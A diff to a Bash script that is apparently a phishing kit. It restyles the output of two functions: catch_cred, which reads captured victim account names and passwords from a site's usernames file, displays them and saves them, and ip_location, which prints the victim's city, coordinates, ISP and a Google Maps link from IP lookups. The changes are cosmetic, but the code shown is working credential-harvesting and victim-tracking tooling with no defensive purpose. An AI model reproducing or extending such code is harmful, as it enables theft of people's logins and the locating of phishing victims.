@@ -233,8 +233,8 @@ catch_cred() {
     account=$(grep -o 'Account:.*' sites/$website/usernames.txt | cut -d " " -f2)
     IFS=$'\n'
     password=$(grep -o 'Pass:.*' sites/$website/usernames.txt | cut -d ":" -f2)
-    printf "${GREEN}[-]${ORANGE} Account: ${RED} %s\n" $account
-    printf "${GREEN}[-]${ORANGE} Password: ${RED} %s\n" $password
+    printf "${GREEN}[👤👤👤]${ORANGE} Account: ${RED} %s\n" $account
+    printf "${GREEN}[🔑🔑🔑]${ORANGE} Password: ${RED} %s\n" $password
     cat sites/$website/usernames.txt >> sites/$website/saved.usernames.txt
     printf "${GREEN}[-]${ORANGE} Saved:${RED} sites/%s/saved.usernames.txt \n" $website
     killall -2 php > /dev/null 2>&1
@@ -256,19 +256,27 @@ ip_location() {
     userpostal=$(echo $ipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
     userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
     usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    printf "${RED}-----------------------------IP Details--------------------------------\n"
-    printf "\n"
-    printf "  ${ORANGE}  City            >>         ${GREEN}   $usercity\n"
-    printf "  ${ORANGE}  Region          >>         ${GREEN}   $useregion\n"
-    printf "  ${ORANGE}  Country         >>         ${GREEN}   $usercountry\n"
-    printf "  ${ORANGE}  Latitude        >>         ${GREEN}    $userlat\n"
-    printf "  ${ORANGE}  Longitude       >>         ${GREEN}    $userlon\n"
-    printf "  ${ORANGE}  Time Zone       >>         ${GREEN}    $usertime\n"
-    printf "  ${ORANGE}  Postal Code     >>         ${GREEN}    $userpostal\n"
-    printf "  ${ORANGE}  Carrier         >>         ${GREEN}   $userisp\n"
-    printf "  ${ORANGE}  Calling Code    >>         ${GREEN}   $usercalling\n"
-    printf "  ${ORANGE}  Google Location >>         ${CYAN} https://maps.google.com/?q=$userlat,$userlon\n"
-    printf "${RED}-----------------------------------------------------------------------\n"
+    printf "${RED}-----------------------------IP Details---------------------------------------------------------\n"
+    printf "  ${ORANGE}  City            >>         ${GREEN}   $usercity"                                       
+    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
+    printf "  ${ORANGE}  Region          >>         ${GREEN}   $useregion"
+    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
+    printf "  ${ORANGE}  Country         >>         ${GREEN}   $usercountry"
+    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
+    printf "  ${ORANGE}  Latitude        >>         ${GREEN}    $userlat"
+    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
+    printf "  ${ORANGE}  Longitude       >>         ${GREEN}    $userlon"
+    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
+    printf "  ${ORANGE}  Time Zone       >>         ${GREEN}    $usertime"
+    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
+    printf "  ${ORANGE}  Postal Code     >>         ${GREEN}    $userpostal"
+    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
+    printf "  ${ORANGE}  Carrier         >>         ${GREEN}   $userisp"
+    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
+    printf "  ${ORANGE}  Calling Code    >>         ${GREEN}   $usercalling"
+    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
+    printf "  ${ORANGE}  Google Location >>         ${CYAN} https://maps.google.com/?q=$userlat,$userlon"
+    printf "${RED}------------------------------------------------------------------------------------------------\n"
     getcredentials
 }
 
